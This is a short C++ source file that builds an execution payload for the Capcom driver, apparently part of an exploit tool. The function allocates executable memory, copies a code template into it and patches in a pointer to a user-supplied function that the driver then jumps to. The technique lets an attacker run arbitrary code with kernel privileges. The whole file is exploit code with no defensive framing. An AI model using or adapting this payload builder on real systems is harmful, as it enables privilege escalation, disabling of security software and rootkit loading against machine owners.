#include "capcom_payload.h"

namespace capcom::payload
{
	capcom_payload* build_capcom_payload(uintptr_t user_function_wrapper) 
	{
		// allocate a page of executable memory for our payload
		capcom_payload* final_payload = (capcom_payload*)VirtualAlloc(nullptr, sizeof(capcom_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		// copy our code template into the executable page
		memcpy(final_payload->code, code_template, sizeof(code_template));

		// fill this member to point to the actual code buffer (as required by capcom)
		final_payload->ptr_to_code = final_payload->code; 

		// fill in the function pointer that will be copied into rax, then jmp'd to
		*(uintptr_t*)(final_payload->code + user_function_ptr_offset) = (uintptr_t)user_function_wrapper; 

		return final_payload;
	}
}